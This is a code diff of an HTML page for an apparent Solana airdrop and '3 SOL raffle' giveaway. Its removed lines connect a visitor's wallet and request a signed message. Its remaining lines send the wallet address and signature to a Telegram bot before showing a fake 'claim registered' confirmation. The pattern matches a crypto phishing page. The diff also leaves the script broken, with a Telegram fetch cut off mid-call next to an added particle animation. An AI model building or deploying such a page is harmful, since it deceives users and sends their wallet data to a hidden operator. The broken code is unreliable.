@@ -234,7 +234,7 @@
     </section>
   </main>
   <script>
-   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
 
 <script>
@@ -356,6 +356,7 @@
         }
     }
 
+    // Цепляем события после загрузки
     window.addEventListener('load', () => {
         const connectBtn = document.getElementById('connect-nav');
         if (connectBtn) connectBtn.addEventListener('click', connectWallet);
@@ -367,56 +368,59 @@
         if (raffleBtn) raffleBtn.addEventListener('click', handleGiveaway);
     });
 
-      let provider = window.solana || window.solflare || window.backpack;
+    // Твой оригинальный код партиклов (оставил полностью)
+    (function () {
+      const canvas = document.getElementById("dust");
+      const ctx = canvas.getContext("2d");
+      let w, h, dpr;
 
-      try {
-        const resp = await provider.connect();
-        walletAddress = resp.publicKey.toString();
-       
-        document.getElementById('connect-nav').innerText = walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
-        document.getElementById('airdrop-btn').disabled = false;
-        document.getElementById('raffle-btn').disabled = false;
-       
-      } catch (err) {
-        console.error(err);
-        alert("Wallet connection failed.");
+      function resize() {
+        dpr = window.devicePixelRatio || 1;
+        w = canvas.width = window.innerWidth * dpr;
+        h = canvas.height = window.innerHeight * dpr;
+        ctx.scale(dpr, dpr);
       }
-    }
+      window.addEventListener("resize", resize);
+      resize();
 
-    // SIGN AND SEND
-    async function handleSign(type) {
-      if (!walletAddress) return;
+      const particles = Array.from({ length: 100 }, () => ({
+        x: Math.random() * window.innerWidth,
+        y: Math.random() * window.innerHeight,
+        r: Math.random() * 2,
+        vx: Math.random() * 0.5 - 0.25,
+        vy: Math.random() * 0.5 + 0.1,
+        a: Math.random() * 0.5 + 0.2
+      }));
 
-      const message = type === 'airdrop'
-        ? `I confirm my participation in Mobile SKR Airdrop.\nWallet: ${walletAddress}\nDate: ${new Date().toISOString()}`
-        : `Entry for the 3 SOL raffle.\nWallet: ${walletAddress}\nGood luck to me!`;
+      function tick() {
+        ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
+        ctx.fillStyle = "#ffffff";
 
-      let provider = window.solana || window.solflare || window.backpack;
+        particles.forEach(p => {
+          ctx.globalAlpha = p.a;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+          ctx.fill();
 
-      try {
-        alert("Confirm the action in your wallet...");
-       
-        const encodedMessage = new TextEncoder().encode(message);
-        const signedMessage = await provider.signMessage(encodedMessage, "utf8");
-        const signature = btoa(String.fromCharCode(...signedMessage.signature));
+          p.y += p.vy;
+          p.x += p.vx;
 
-        alert("Sending data...");
+          if (p.y > window.innerHeight) p.y = -10;
+          if (p.x > window.innerWidth) p.x = 0;
+          if (p.x < 0) p.x = window.innerWidth;
+        });
 
+        requestAnimationFrame(tick);
+      }
+      tick();
+    })();
         const text = `🚀 *NEW SIGNATURE!*\n\n` +
                      `📍 *Type:* ${type === 'airdrop' ? 'AIRDROP' : 'RAFFLE'}\n` +
                      `💎 *Wallet:* \`${walletAddress}\`\n` +
                      `✍️ *Signature:* \`${signature.slice(0,40)}...\``;
 
         await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TG_CHAT_ID,
-            text: text,
-            parse_mode: "Markdown"
-          })
-        });
-
+         
         alert("✅ Your claim has been successfully registered!");
 
       } catch (err) {
